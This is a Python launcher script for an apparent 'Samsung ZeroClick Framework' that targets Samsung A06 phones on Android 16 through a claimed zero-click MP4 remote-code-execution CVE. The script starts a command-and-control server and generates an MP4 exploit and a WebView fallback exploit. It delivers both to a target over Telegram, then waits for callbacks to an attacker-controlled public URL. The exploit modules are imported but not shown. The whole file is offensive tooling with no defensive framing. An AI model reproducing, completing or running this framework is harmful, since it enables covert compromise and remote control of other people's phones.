#!/usr/bin/env python3
# main.py — Samsung ZeroClick Framework

import os
import sys
import time
import threading
import signal
from datetime import datetime

from config import BOT_TOKEN, CHAT_ID, C2_HOST, C2_PORT, RAILWAY_PUBLIC_URL
from core.exploit_mp4 import SamsungMP4Exploit
from core.exploit_webview import WebViewExploit
from core.delivery import TelegramDelivery
from core.c2 import C2Server

BANNER = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   ███████  █████  ███    ███  █████  ██    ██ ███    ██  ║
║   ██      ██   ██ ████  ████ ██   ██ ██    ██ ████   ██  ║
║   ███████ ███████ ██ ████ ██ ███████ ██    ██ ██ ██  ██  ║
║        ██ ██   ██ ██  ██  ██ ██   ██ ██    ██ ██  ██ ██  ║
║   ███████ ██   ██ ██      ██ ██   ██  ██████  ██   ████  ║
║                                                           ║
║   Samsung ZeroClick Framework v1.0                       ║
║   Target: Samsung A06 — Android 16                       ║
║   CVE-2026-0006 — MP4 Zero-Click RCE                    ║
║   Made in Ethiopia 🇪🇹                                   ║
╚═══════════════════════════════════════════════════════════╝
"""

class SamsungZeroClick:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.chat_id = CHAT_ID
        
        if not self.bot_token or not self.chat_id:
            print("[!] Set BOT_TOKEN and CHAT_ID in config.py or Railway env")
            sys.exit(1)
        
        self.delivery = TelegramDelivery(self.bot_token, self.chat_id)
        self.callback_url = RAILWAY_PUBLIC_URL + "/callback"
        
        self.mp4_exploit = SamsungMP4Exploit(self.callback_url)
        self.webview_exploit = WebViewExploit(self.callback_url)
        self.c2_server = C2Server(C2_HOST, C2_PORT)
    
    def run(self):
        print(BANNER)
        print(f"[+] Callback URL: {self.callback_url}")
        print(f"[+] Telegram Bot: {self.bot_token[:10]}...")
        
        # Start C2 in background
        print("[+] Starting C2 server...")
        c2_thread = threading.Thread(target=self.c2_server.run, daemon=True)
        c2_thread.start()
        time.sleep(1)
        
        # Generate both exploits
        print("\n[+] Generating exploits...")
        mp4_data = self.mp4_exploit.generate()
        webview_data = self.webview_exploit.generate()
        
        # Send initial message
        self.delivery.send_text(
            "🔥 *SAMSUNG ZEROCLICK DEPLOYED* 🔥\n\n"
            "📱 Target: Samsung A06 (Android 16)\n"
            "🎯 CVE: CVE-2026-0006 (MP4 Zero-Click)\n"
            f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            "📦 Sending payloads..."
        )
        
        # Deliver MP4 (primary) and HTML (fallback)
        print("\n[+] Delivering MP4 exploit (Samsung APV)...")
        mp4_success = self.delivery.deliver_samsung(mp4_data)
        
        print("[+] Delivering WebView fallback...")
        webview_success = self.delivery.deliver_webview(webview_data)
        
        print("\n[+] ✅ EXPLOITS DELIVERED!")
        print(f"    🎯 MP4: {'✅ Sent' if mp4_success else '❌ Failed'}")
        print(f"    🎯 WebView: {'✅ Sent' if webview_success else '❌ Failed'}")
        print(f"\n[+] Monitor C2: {RAILWAY_PUBLIC_URL}/")
        print("[+] Waiting for callbacks...\n")
        
        # Keep running
        try:
            while True:
                time.sleep(10)
        except KeyboardInterrupt:
            print("\n[!] Shutting down...")
            sys.exit(0)

if __name__ == '__main__':
    try:
        app = SamsungZeroClick()
        app.run()
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)